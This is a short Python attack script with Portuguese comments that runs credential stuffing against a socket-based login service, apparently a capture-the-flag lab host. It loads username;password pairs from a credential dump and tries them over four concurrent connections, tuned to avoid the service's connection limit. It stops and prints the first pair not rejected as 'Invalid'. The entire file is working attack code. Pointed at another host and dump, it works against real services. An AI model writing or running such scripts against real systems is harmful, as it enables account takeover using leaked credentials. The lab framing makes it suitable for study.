#!/usr/bin/env python3
# Credential stuffing contra o serviço de login por socket.
#
# Calibração importante: o serviço aceita só ~3-4 conexões simultâneas; com mais
# que isso TODAS as conexões são recusadas (erro). Por isso WORKERS=4. Também
# mando usuário e senha na mesma escrita (o serviço lê duas linhas em sequência),
# cortando round-trips. Para na primeira resposta que NÃO contém "Invalid".
#
# Uso: TARGET_HOST=host TARGET_PORT=porta python3 scripts/script1.py

import socket, os
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = os.environ.get("TARGET_HOST", "xebec.cylabacademy.net")
PORT = int(os.environ.get("TARGET_PORT", "10001"))
CREDS_FILE = "files/creds-dump.txt"
WORKERS = 4  # o serviço recusa conexões com concorrência alta

FOUND = {}

def try_login(up):
    if FOUND:
        return None
    u, p = up
    try:
        s = socket.create_connection((HOST, PORT), timeout=8)
        s.settimeout(6)
        s.sendall(u.encode() + b"\n" + p.encode() + b"\n")  # Username + Password juntos
        data = b""
        for _ in range(10):
            d = s.recv(4096)
            if not d:
                break
            data += d
            if b"}" in data or b"Invalid" in data:
                break
        s.close()
        r = data.decode(errors="replace")
        if "Invalid" not in r and r.strip():
            return (u, p, r)
    except Exception:
        return None
    return None

def main():
    creds = []
    with open(CREDS_FILE, encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if line and ";" in line:
                u, p = line.split(";", 1)  # senha pode conter ';'
                creds.append((u, p))
    print(f"[*] {len(creds)} credenciais, {WORKERS} workers, alvo {HOST}:{PORT}")
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(try_login, up): up for up in creds}
        for fut in as_completed(futs):
            r = fut.result()
            if r:
                FOUND["hit"] = r
                print(f"\n[+] par válido: {r[0]}:{r[1]}")
                print(r[2])
                return
    print("[-] nenhum par válido encontrado (dump não corresponde a esta instância?)")

if __name__ == "__main__":
    main()
